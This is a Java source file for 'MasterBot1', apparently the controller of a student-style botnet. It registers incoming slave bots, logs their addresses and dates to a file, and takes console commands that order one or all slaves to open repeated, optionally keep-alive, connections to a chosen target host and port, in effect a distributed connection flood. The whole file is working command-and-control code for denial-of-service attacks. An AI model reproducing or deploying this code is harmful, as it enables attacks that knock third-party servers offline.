import java.net.*;
import java.util.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.io.BufferedWriter.*;

public class MasterBot1 extends Thread {
	static String SlavAdd,TarAdd, TarPort, Connection,DisConnection,url;
	static boolean keepAlive;
	static ArrayList<Socket> lstSlaveBots = new ArrayList<>();
	static SlaveBot1 b = new SlaveBot1();

	public static void main(String [] args) throws IOException {

		int port =Integer.parseInt(args[1]);
		if(port != 0){
			try {
				Thread t = new MasterBot1(port);
				t.start();
			
			}catch(IOException e) {
				e.printStackTrace();
				
				System.out.println("Terminating abnormally with exit code -1");
				System.exit(-1);
			}
		}
		try{
		String commandLine;
		BufferedReader console = new BufferedReader
				(new InputStreamReader(System.in));
		BufferedReader br = null;
		
		while (true) {
			
			commandLine = console.readLine();
			
			if (commandLine.equals(""))
				continue;
			

			if (commandLine.endsWith("list"))
			{	
				String para;

				br = new BufferedReader(new FileReader("client_record.txt"));
				if((para = br.readLine()) == null)
				{
					System.out.println("List is Empty");
				}
				else
				{
					br = new BufferedReader(new FileReader("client_record.txt"));
					while ((para = br.readLine()) != null)
					{
						System.out.println(para);
					}
				}				

			}
			if (commandLine.startsWith("connect "))
			{	
				String[] arrayOfString = commandLine.split("\\s+");
				
				if(arrayOfString.length == 4) 
				{
					SlavAdd = arrayOfString[1];
					TarAdd = arrayOfString[2];
					TarPort = arrayOfString[3];
					Connection = "1";
					keepAlive = false;
					url = "";
					//boolean keepAlive = true;
				}
				else if(arrayOfString.length == 5)
				{
					//System.out.println("Sddsfdsdfs");
				SlavAdd = arrayOfString[1];
				TarAdd = arrayOfString[2];
				TarPort = arrayOfString[3];
				
					if(arrayOfString[4].contains("keepAlive") || arrayOfString[4].contains("keepalive"))
					{
						Connection = "1";
						keepAlive = true;
						//System.out.println("fffffff");
						url = "";
					}
					else if(arrayOfString[4].contains("url"))
					{
					//	System.out.println("jjgugggjk");
						Connection = "1";
						keepAlive = false;
						url = arrayOfString[4];
						//System.out.println(url);
					}
					else
					{
						//System.out.println("rrrrr");
						Connection = arrayOfString[4];
						keepAlive = false;
						url = "";
					}

				}
				else if(arrayOfString.length == 6)
				{
					SlavAdd = arrayOfString[1];
					TarAdd = arrayOfString[2];
					TarPort = arrayOfString[3];
					if((arrayOfString[4].contains("keepAlive") || arrayOfString[4].contains("keepalive")) && (arrayOfString[5].contains("url")))
						{
							keepAlive = true;
							url = arrayOfString[5];
							Connection = "1";
						}
					else if(arrayOfString[5].contains("keepAlive") || arrayOfString[5].contains("keepalive"))
						{
							keepAlive = true;
							Connection = arrayOfString[4];
							url = ""; 
						}
					else if(arrayOfString[5].contains("url"))
						{
							keepAlive = false;
							url = arrayOfString[5];
							Connection = arrayOfString[4];
						}
				}
				else if(arrayOfString.length == 7)
				{
					
					SlavAdd = arrayOfString[1];
					TarAdd = arrayOfString[2];
					TarPort = arrayOfString[3];
					keepAlive = true;
					url = arrayOfString[6];
					Connection = arrayOfString[4];
					
				}
		
				if(SlavAdd.equalsIgnoreCase("all"))
				{
					
					for(int k=0; k<lstSlaveBots.size();k++)
					{	 
						for(int j = 0; j < Integer.parseInt(Connection);j++)
						{
							b.createSocket(lstSlaveBots.get(k),Integer.parseInt(TarPort),TarAdd,Integer.parseInt(Connection),keepAlive,url);
						}

					}


				}
				else
				{
					String line;
					
					for(int j =0; j< lstSlaveBots.size();j++)
					{
						line = "/"+SlavAdd;

						if(line.equalsIgnoreCase(lstSlaveBots.get(j).getRemoteSocketAddress().toString()))
						{
							
							for(int k = 0; k < Integer.parseInt(Connection);k++)
							{
							b.createSocket(lstSlaveBots.get(j),Integer.parseInt(TarPort),TarAdd,Integer.parseInt(Connection),keepAlive,url);
							}
						}
		
					}
				}
			}
					
		if (commandLine.contains("disconnect"))
		{	 String[] arrayOfString = commandLine.split("\\s+");
		if(arrayOfString.length == 3)
		{
			SlavAdd = arrayOfString[1];
			TarAdd = arrayOfString[2];
			TarPort = "1000";
		}
		else
		{
			SlavAdd = arrayOfString[1];
			TarAdd = arrayOfString[2];
			TarPort = arrayOfString[3];			
		}
			 if(SlavAdd.equalsIgnoreCase("all"))
				{
				// for(int k=0; k<lstSlaveBots.size();k++)
				//	{	 
					 b.disconnect(Integer.parseInt(TarPort),TarAdd);
				//	}
				}
			 else
			 	{
				 
					 b.disconnect(Integer.parseInt(TarPort),TarAdd);
				 
			 	}
		

		}
		if (commandLine.equals("exit"))
		{	
			System.out.println("...Terminating the Virtual Machine");
		System.out.println("...Done");
		System.out.println("Please Close manually with Options > Close");
		System.exit(0);
		}
		if (commandLine.equals("-1"))
		{	
			System.out.println("...Terminating the Virtual Machine");
		System.out.println("...Done");
		System.out.println("Please Close manually with Options > Close");
		System.exit(0);
		}
	
		}
		}catch (Exception e){
			e.printStackTrace();
			System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);}


}

private ServerSocket serverSocket;


public MasterBot1(int port) throws IOException {

	serverSocket = new ServerSocket(port);	
}	

public void run() {

	try {
		int count=0;
		BufferedWriter output = null;
		String text = "";
		File file = new File("client_record.txt");
		output = new BufferedWriter(new FileWriter(file));
		text = "SlaveHostName" +"\t"+"IPAddress"+"\t\t"+"SourcePortNumber"+"\t"+"RegistrationDate";
		output.write(text);
		output.newLine();
		while(true)
		{
			count++;

			
			Socket server = new Socket();
			server = serverSocket.accept();
			lstSlaveBots.add(server);
			text = "Client:"+count+"\t"  ;
			output.write(text);

			text = server.getRemoteSocketAddress()+"\t";
			output.write(text);

			text = serverSocket.getLocalPort()+"\t"+"\t";
			output.write(text);

			text = "\t"+new SimpleDateFormat("yyyy/MM/dd").format(Calendar.getInstance().getTime());
			output.write(text);
			output.newLine();


			output.flush();  

			
		}		   

	}
	catch(IOException e) {
		e.printStackTrace();
		System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);;
	}finally{
		try{
			
			serverSocket.close();
		}catch(IOException e){System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);}
	}

	try {

		String Line;
		BufferedReader reader = null;
		reader = new BufferedReader(new FileReader("client_record.txt"));

		while ((Line = reader.readLine()) != null) {
			System.out.println(Line);
		}

	} catch (IOException e) {
		e.printStackTrace();
		System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);;
	} 
}	
}